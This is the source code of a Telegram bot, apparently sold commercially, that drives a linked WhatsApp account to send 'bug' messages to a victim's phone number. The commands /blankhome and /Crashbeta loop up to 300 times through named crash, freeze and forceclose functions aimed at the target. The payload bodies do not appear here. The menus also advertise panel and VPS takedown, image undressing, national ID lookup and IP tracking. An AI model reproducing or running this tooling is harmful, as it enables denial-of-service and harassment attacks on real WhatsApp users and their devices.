////kontol
const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs-extra");
const fsp = fs.promises;
const path = require("path");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@otaxayun/baileys');
const pino = require("pino");
const os = require('os')
const axios = require("axios");
const chalk = require("chalk");
const fetch = require('node-fetch')
const FormData = require('form-data')
const httpMod = require('http')
const httpsMod = require('https')
const ms = require("ms");
const AdmZip = require("adm-zip");
const express = require("express");
const readline = require('readline');
const { fromBuffer } = require("file-type");
const crypto = require("crypto");
const sessionPath = './session';
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const bot = new Telegraf(BOT_TOKEN);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./database/premiums.json";
const adminFile = "./database/admins.json";

const groupOnlyFile = "./database/GroupOnly.json";
const COOLDOWN_FILE = "./database/cooldown.json";
// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// ======= MIDDLEWARE OWNER =======
const checkOwner = async (ctx, next) => {
  const userId = ctx.from.id.toString();
  if (!OWNER_IDS.includes(userId)) {
    const image = getRandomImage();
    await ctx.replyWithPhoto(
      { url: image },
      {
        caption: "「 ⓘ Fitur Ini Khusus Owner Bg 」",
        ...Markup.inlineKeyboard([
          [Markup.button.url("DEVELOPER", "https://t.me/Raizelzry")],
        ]),
      }
    );
    return;
  }
  return next();
};

// ======= MIDDLEWARE ADMIN =======
const checkAdmin = async (ctx, next) => {
  const userId = ctx.from.id.toString();
  if (!adminUsers.includes(userId)) {
    const image = getRandomImage();
    await ctx.replyWithPhoto(
      { url: image },
      {
        caption: "「 ⓘ Fitur Ini Khusus Admin Bg 」",
        ...Markup.inlineKeyboard([
          [Markup.button.url("DEVELOPER", "https://t.me/Raizelzry")],
        ]),
      }
    );
    return;
  }
  return next();
};

// ======= MIDDLEWARE PREMIUM =======
const checkPremium = async (ctx, next) => {
  const userId = ctx.from.id.toString();
  if (!premiumUsers.includes(userId)) {
    const image = getRandomImage();
    await ctx.replyWithPhoto(
      { url: image },
      {
        caption: "「 ⓘ Fitur Ini Khusus Premium Bg 」",
        ...Markup.inlineKeyboard([
          [Markup.button.url("DEVELOPER", "https://t.me/Raizelzry")],
        ]),
      }
    );
    return;
  }
  return next();
};
// Membaca status grup-only dari file (aktif/tidak)
let groupOnlyStatus = fs.existsSync(groupOnlyFile) ? JSON.parse(fs.readFileSync(groupOnlyFile)) : { enabled: false };

// Fungsi untuk menyimpan status mode grup ke file
function saveGroupOnly() {
fs.writeFileSync(groupOnlyFile, JSON.stringify(groupOnlyStatus, null, 2));
}

const checkGroupOnly = (ctx, next) => {
const isGroup = ctx.chat.type.endsWith('group');

if (groupOnlyStatus.enabled && !isGroup) {
return ctx.reply("❌ KHUSUS GRUP MEMEK SONO START DI GRUB", { parse_mode: "Markdown" });
}
if (!groupOnlyStatus.enabled && isGroup) {
return ctx.reply("❌ KHUSUS PV BOT TOLOL SONO START DI PV BOT", { parse_mode: "Markdown" });
}

next();
};
//==check cooldown====\\
function readCooldownData() {
  try {
    if (fs.existsSync(COOLDOWN_FILE)) {
      return JSON.parse(fs.readFileSync(COOLDOWN_FILE));
    }
    return { payload: { cooldown: 0, lastUsed: 0 } };
  } catch (err) {
    console.log("Error reading cooldown:", err);
    return { payload: { cooldown: 0, lastUsed: 0 } };
  }
}

function saveCooldownData(data) {
  try {
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("Error saving cooldown:", err);
  }
}
// === Fungsi Admin / Premium ===

const addAdmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addPremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};

if (typeof okBox === "undefined") global.okBox = (a) => "⸙ EXERCISE GOTSHH — 𝙊𝙆\n" + a.join("\n")
if (typeof errBox === "undefined") global.errBox = (a) => "⸙ EXERCISE GOTSHH — 𝙀𝙍𝙍𝙊𝙍\n" + a.join("\n")

const AX = axios.create({
  timeout: 20000,
  validateStatus: (s) => s >= 200 && s < 500,
  httpAgent: new httpMod.Agent({ keepAlive: true }),
  httpsAgent: new httpsMod.Agent({ keepAlive: true }),
})


let Abim = null
let isWhatsAppConnected = false
let linkedWhatsAppNumber = ""
const usePairingCode = true

const randomImages = [
"https://files.catbox.moe/32hze5.jpg",
"https://files.catbox.moe/32hze5.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime()
  const hours = Math.floor(uptimeSeconds / 3600)
  const minutes = Math.floor((uptimeSeconds % 3600) / 60)
  const seconds = Math.floor(uptimeSeconds % 60)
  return `${hours}h ${minutes}m ${seconds}s`
}

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({ input: process.stdin, output: process.stdout })
    rl.question(query, (answer) => {
      rl.close()
      resolve(answer)
    })
  })

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
 
  const connectionOptions = {
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder, you can change this or remove it
    }),
  };
  
  Abim = makeWASocket(connectionOptions);
  
  Abim.ev.on('creds.update', saveCreds);
  Abim.store = store;
  store.bind(Abim.ev);
  
  Abim.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'open') {
      Abim.newsletterFollow("120363421807944293@newsletter")
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Connection')}
╰─────────────────────────────╯`));
  }
  
  if (connection === 'close') {
    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
    console.log(
    chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white.bold('Whatsapp Disconnected')}
╰─────────────────────────────╯`),
  shouldReconnect ? chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white.bold('Reconnecting Again')}
╰─────────────────────────────╯`) : ''
);
if (shouldReconnect) {
  startSesi();
}
isWhatsAppConnected = false;
}
});
}
const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
╭⧽『 𝐄𝐑𝐑𝐎𝐑 』
│〣 Belum Terhubung, Bung.
│〣 Sistem menolak akses lu.
╰──────────────────╯

╭⧽『 𝐂𝐀𝐓𝐀𝐓𝐀𝐍 』
│〣 Gunakan perintah /reqpair
│〣 Untuk mengaktifkan mode bug.
╰──────────────────╯
`);
return;
}
next();
};

bot.command(["menu", "start"], checkGroupOnly, async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const now = Date.now();
  const waktuRunPanel = getUptime();
  const mainMenuMessage = `<blockquote>⬡═—⊱ EXERCISE GOTSHH ⊰—═⬡</blockquote>
( 🦋 ) - 情報 𝗢𝗹𝗮𝗮 ${Name}
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
<blockquote>𒑡 Information ﾒ Bot</blockquote>
• Owner : @xarnlow17
• Owner²: @Raizelzry
• Version : 5.0
• Status : Vvip Buy Only
• Time : ${waktuRunPanel}
<blockquote>「 THANKS 」</blockquote>
`;

  const mainKeyboard = [
    [
      {
        text: "SUPPORT",
        callback_data: "Thanto_menu",
       },
       {
        text: "SETTIGS",
        callback_data: "owner_menu",
       },
     ],
     [
      {
        text: "ATTACK",
       callback_data: "bug_menu",
      },
      {
        text: "TOOLS",
       callback_data: "tools_menu",
      },
    ],
    [
      {
        text: "INFORMATION",
        url: "https://t.me/raizelchne",
       },
       {
        text: "AUTHOR",
        url: "https://t.me/Raizelzry",
     },
    ],
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: mainKeyboard },
  });
});
// Handler untuk owner_menu
bot.action('owner_menu', checkGroupOnly, async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const mainMenuMessage = `<blockquote>⬡═—⊱ EXERCISE GOTSHH ⊰—═⬡</blockquote>
 ( 🦋 ) - 情報 𝗢𝗹𝗮𝗮 ${Name}
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
<blockquote>𒑡 Information ﾒ Bot</blockquote>
• Owner : @xarnlow17
• Owner : @Raizelzry
• Version : 5.0 
• Status : Vvip Buy Only
• Time : ${waktuRunPanel}
<blockquote>『 𝐀𝐝𝐦𝐢𝐧 𝐀𝐜𝐜𝐞𝐬𝐬 』</blockquote>
ᝰ. /addadmin user id 
ᝰ. /deladmin delete user id 
ᝰ. /addprem user id
ᝰ. /delprem delete user id
ᝰ. /cekprem checkprem user id
<blockquote>『 𝐎𝐰𝐧𝐞𝐫 𝐀𝐜𝐜𝐞𝐬𝐬  』</blockquote>
ᝰ. /status view connected status
ᝰ. /delsesi delete session
ᝰ. /reqpair connect whatsapp
ᝰ. /setcd set jeda 
ᝰ. /grouponly on & off 
<blockquote>「 THANKS 」</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔄 BACK", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
bot.action("tools_menu", checkGroupOnly, async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const mainMenuMessage = `<blockquote>⬡═—⊱ EXERCISE GOTSHH ⊰—═⬡</blockquote>
 ( 🦋 ) - 情報 𝗢𝗹𝗮𝗮 ${Name}
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
<blockquote>𒑡 Information ﾒ Bot</blockquote>
• Owner : @xarnlow17
• Owner : @Raizelzry
• Version : 5.0
• Status : Vvip Buy Only
• Time : ${waktuRunPanel}
<blockquote>『 𝐀𝐥𝐥 𝐓𝐨𝐨𝐥𝐬 』</blockquote>
ᝰ. /deladp - nama adp
ᝰ. /adplist - daftar nama adp
ᝰ. /cadp ptla,ptlc,domain 
ᝰ. /adp - nama adp
ᝰ. /tourl - media ke link
ᝰ. /iqc - kata kata 
ᝰ. /info check ID 
ᝰ. /tonaked - membuka baju
ᝰ. /open - membuka file
ᝰ. /trackip - ip Information
ᝰ. /xn - video 18+ 
ᝰ. /grouponly on & off 
ᝰ. /Toolsdua tools ke dua 
<blockquote>「 THANKS 」</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "➡️ Tools 2", callback_data: "tools2" }],
      [{ text: "🔁 BACK", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
bot.action("tools2", checkGroupOnly, async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

    const mainMenuMessage = `
<blockquote>⬡═—⊱ EXERCISE GOTSHH ⊰—═⬡</blockquote>
( 🦋 ) - 情報 𝗢𝗹𝗮𝗮 ${Name}
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
<blockquote>𒑡 Information ﾒ Bot</blockquote>
• Owner : @xarnlow17
• Owner : @Raizelzry
• Version : 5.0
• Status : Vvip Buy Only
• Time : ${waktuRunPanel}
<blockquote>menu tools lagi di rancang dan mau di kembangkan gunakan yang dengan bijak yak</blockquote>
<blockquote>『 𝐓𝐨𝐨𝐥𝐬 𝐝𝐮𝐚 』</blockquote>
〣 /antilink - anti link 
〣 /setwarn - atur kata terlarang
〣 /installpanel - install panel
〣 /tagall - tagall all member
〣 /cekprem - cekprem member
〣 /addprem - addprem gb
〣 /searchdouyin - search douyin
〣 /capcutsearch - capcutsearch
〣 /meme - meme random
〣 /otakudesu - otakudesu
〣 /toprompt - toprompt
〣 /uploadmf - upload mediafire
〣 /hd - membuat gambar hd
〣 /bratbahlil - membuat brat Bahlil
〣 /jadihitam - jadi hitam
〣 /jadihijab - jadi hijab
〣 /broadcast - broadcast
〣 /broadcastv2 - support media+teks
〣 /ytplay - yt play 
〣 /tiktoktobrut - tiktok tobrut
〣 /tiktokmeme - tiktok meme
〣 /kalkulator - kalkulator
〣 /totalgrup - melihat total group
<blockquote>「 𝐓𝐇𝐀𝐍𝐊𝐒 」</blockquote>
`;

    const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "➡️ Tools 3", callback_data: "tools3" }],
      [{ text: "🔁 Back Tools 1", callback_data: "tools_menu" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
bot.action("tools3", checkGroupOnly, async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

    const mainMenuMessage = `
<blockquote>⬡═—⊱ EXERCISE GOTSHH ⊰—═⬡</blockquote>
( 🦋 ) - 情報 𝗢𝗹𝗮𝗮 ${Name}
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
<blockquote>𒑡 Information ﾒ Bot</blockquote>
• Owner : @xarnlow17
• Owner : @Raizelzry
• Version : 5.0
• Status : Vvip Buy Only
• Time : ${waktuRunPanel}
<blockquote>menu tools lagi di rancang dan mau di kembangkan gunakan yang dengan bijak yak</blockquote>
<blockquote>『 𝐓𝐨𝐨𝐥𝐬 𝐝𝐮𝐚 』</blockquote>
〣 /login - login token 
〣 /logout - logout token
〣 /listlogin - daftar token
〣 /notifikasi - nama token on/off 
〣 /rasuk - nama token 
〣 /brat - membuat sticker
〣 /Encrypt - Encrypt File
〣 /nulis - menulis 
〣 /play - mencari lagu
〣 /infopanel - cek informasi panel
〣 /cektampan - cek ketampanan
〣 /toimage - mengubah sticker ke media
〣 /killpanel - membuat panel & vps down
〣 /infogempa - cek seputaran gempa
〣 /stopkill - menghentikan proses kill
〣 /fix - membantu fix eror 
〣 /cekban - mengecek nomor 
〣 /nikparse - cek informasi nik
〣 /doa - daftar doa
〣 /lapor - kirim pesan ke owner
〣 /tt - dowlod vidio tiktok
<blockquote>「 𝐓𝐇𝐀𝐍𝐊𝐒 」</blockquote>
`;

    const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔁 Back Tools 2", callback_data: "tools2" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk owner_menu
bot.action('bug_menu', checkGroupOnly, async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const mainMenuMessage = `<blockquote>⬡═—⊱ EXERCISE GOTSHH ⊰—═⬡</blockquote>
 ( 🦋 ) - 情報 𝗢𝗹𝗮𝗮 ${Name}
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
<blockquote>𒑡 Information ﾒ Bot</blockquote>
• Owner : @xarnlow17
• Owner : @Raizelzry
• Version : 5.0
• Status : Vvip Buy Only
• Time : ${waktuRunPanel}
<blockquote>『 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 』</blockquote>
ᝰ. /Fc ☇ 62××
╰┈➤ Forclose Home
ᝰ. /XiosBug ☇ 62××
╰┈➤ Gabungan Bug
ᝰ. /Xsystem ☇ 62××
╰┈➤ Freze Home
ᝰ. /Delaysuper ☇ 62××
╰┈➤ Delay Hard
ᝰ /DelayTag ☇ 62××
╰┈➤ Tag Status Invisible
ᝰ /magicdelay ☇ 62××
╰┈➤ Delay Invisible
ᝰ. /blankhome ☇ 62××
╰┈➤ Blank super
ᝰ. /Crashbeta ☇ 62××
╰┈➤ Crash Beta
ᝰ. /DelBug ☇ 62××
╰┈➤ Hapus Bug
ᝰ. /tesfunc ☇ Function,Number,lop
╰┈➤ tes Function Reply 
ᝰ. /xworfcspam ☇ 62××
╰┈➤ Forclose one msg anti log out sender
ᝰ. /blankinvisible ☇ 62××
╰┈➤ blank invisible hard 
ᝰ. /xworrspam
╰┈➤ bug bebas spamm
ᝰ. /xworblank
╰┈➤ blank cursed 
ᝰ. /xvorrblank
╰┈➤ bulldozer and blank 
<blockquote>「 THANKS 」</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔁 BACK", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk owner_menu
bot.action("Thanto_menu", checkGroupOnly, async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const mainMenuMessage = `<blockquote>⬡═—⊱ EXERCISE GOTSHH ⊰—═⬡</blockquote>
 ( 🦋 ) - 情報 𝗢𝗹𝗮𝗮 ${Name}
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
<blockquote>𒑡 Information ﾒ Bot</blockquote>
• Owner : @xarnlow17
• Owner : @Raizelzry
• Version : 5.0
• Status : Vvip Buy Only
• Time : ${waktuRunPanel}
<blockquote>『 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 』</blockquote>
ᝰ ᴀʟʟᴀʜ ( ᴍʏ ɢᴏᴅ )
ᝰ ᴀʟʟ ᴍʏ ᴘᴀᴛɴᴇʀ
ᝰ ꜰᴏʀ ᴀʟʟ ʙᴜʏᴇʀ ꜱᴄʀɪᴘᴛ
ᝰ owner¹ @xarnlow17
ᝰ owner² @raizelzr
ᝰ security @Abdineon
ᝰ security² @Caloxv
ᝰ security³ @Pemulakebeletdev
ᝰ Friend @XerozNotDev
ᝰ penjaga  Another's Kàii 
<blockquote>「 THANKS 」</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔁 BACK", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk back main menu
bot.action("back", checkGroupOnly, async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = Abim && Abim.user
      ? "Online"
      : "Offline"; 
      
  const mainMenuMessage = `<blockquote>⬡═—⊱ EXERCISE GOTSHH ⊰—═⬡</blockquote>
 ( 🦋 ) - 情報 𝗢𝗹𝗮𝗮 ${Name}
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
<blockquote>𒑡 Information ﾒ Bot</blockquote>
• Owner : @xarnlow17
• Owner : @Raizelzry
• Version : 5.0
• Status : Vvip Buy Only
• Time : ${waktuRunPanel}
<blockquote>「 𝐓𝐇𝐀𝐍𝐊𝐒 」</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
     [
      {
        text: "SUPPORT",
        callback_data: "Thanto_menu",
       },
       {
        text: "SETTIGS",
        callback_data: "owner_menu",
       },
     ],
     [
      {
        text: "ATTACK",
       callback_data: "bug_menu",
      },
      {
        text: "TOOLS",
       callback_data: "",
      },
    ],
    [
      {
        text: "INFORMATION",
        url: "https://t.me/raizelchne",
       },
       {
        text: "AUTHOR",
        url: "https://t.me/Raizelzry",
      },
    ],
  ];

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
// Command /doa
bot.command("doa", async (ctx) => {
  try {
    const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
    const waktuRunPanel = getUptime();
    const photo = getRandomImage();

    const mainMenuMessage = `
<blockquote>⬡═—⊱ EXERCISE GOTSHH ⊰—═⬡</blockquote>
( 🦋 ) - 情報 𝗢𝗹𝗮𝗮 ${Name}
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
<blockquote>𒑡 Information ﾒ Bot</blockquote>
• Owner : @xarnlow17
• Owner : @Raizelzry
• Version : 5.0
• Status : Vvip Buy Only
• Time : ${waktuRunPanel}
<blockquote>『 𝐀𝐥𝐥 𝐃𝐨𝐚 』</blockquote>
ᝰ. /niatsetelahwudhu  
ᝰ. /niatwudhu  
ᝰ. /doakeluarkamarmandi  
ᝰ. /doamasukrumah  
ᝰ. /doapagi  
ᝰ. /doamalam  
ᝰ. /doakeluarrumah  
<blockquote>「 𝐓𝐇𝐀𝐍𝐊𝐒 」</blockquote>
`;

    // Membuat tombol inline
    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "DEVELOPER", url: "https://t.me/Raizelzry" }
          ]
        ]
      },
      parse_mode: "HTML"
    };

    await ctx.replyWithPhoto(
      { url: photo },
      { caption: mainMenuMessage, ...keyboard }
    );
  } catch (e) {
    console.error("Error in /doa command:", e);
    await ctx.reply("⚠️ Terjadi kesalahan saat memproses perintah /doa.");
  }
});
//////// -- CASE BUG 1 --- \\\\\\\\\\\
bot.command("blankhome", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /blankhome 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: blankhome
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 5; i < 25; i++) {
    await apollox(target)
    await sleep(2000);
    await CrashBetajj(target)
    await sleep(2000);
    await fcinvisotax(target)
    await sleep(3000);
    await ForceInfinitybak(target)
    await sleep(2000);
    await StickersAbimZ(target)
    await sleep(5000);
    await frezeui(target)
    await sleep(500);
    await NanCrashiPhone(target)
    await sleep(500);
    await Ghostwolf(target)
    await sleep(1000);
    await LocationOtax(target)
    await sleep(500);
    await InvisibleVoc(target)
    await sleep(5000);
    await AxGBlorr(target)
    await sleep(5000);
    await AxDrainbim(target)
    await sleep(5000);
    await BlankPack(target)
    await sleep(3000);
    await OtaxNewUiAbim(target)
    await sleep(1000);
    await SaturnuZLay2(target)
    await sleep(200);
    await XStromNewUi(target)
    await sleep(200);
    await blankVy(target)
    await sleep(200);
    await Bimblankv2(target)
    await sleep(200);
    await KxHJule(sock, target);
    await sleep(200);
  }
});
bot.command("Crashbeta", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /Crashbeta 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: Crashbeta
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 300; i++) {
    await crasphoneNew(target)
    await sleep(4000);
    await fcinvisotax(target)
    await sleep(3000);
    await LocationOtax(target)
    await sleep(2000);
    await Ghostwolf(target)
    await sleep(2000);
    await StickersAbimZ(target)
    await sleep(5000);
    await BlankPack(target)
    await sleep(2000);
    await NanCrashiPhone(target)
    await sleep(2000);
    await AxGBlorr(target)
    await sleep(5000);
    await AxDrainbim(target)
    await sleep(5000);
    await apollox(target)
    await sleep(2000);
    await KxHJule(sock, target);
    await sleep(2000); 
  }
});
